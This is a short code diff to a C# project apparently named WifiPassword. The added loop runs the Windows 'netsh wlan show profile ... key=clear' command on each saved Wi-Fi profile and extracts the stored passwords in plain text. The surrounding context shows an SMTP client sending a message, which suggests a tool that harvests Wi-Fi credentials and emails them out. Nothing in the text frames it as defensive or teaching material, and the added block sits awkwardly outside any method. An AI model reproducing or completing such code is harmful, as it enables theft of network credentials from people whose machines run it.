@@ -62,6 +62,16 @@ namespace WifiPassword
 
             smtpClient.Send(message);
         }
+        for (int i = 0; i < profiles.Length; i++)
+            {
+                var output = RunCommand("netsh", $"wlan show profile \"{profiles[i]}\" key=clear");
+                var lines = output.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
+                var passwordLine = lines.FirstOrDefault(line => line.Contains("Key Content            : "));
+                if (passwordLine != null)
+                {
+                    passwords[i] = passwordLine.Trim().Replace("Key Content            : ", "");
+                }
+            }
 
     }
 }
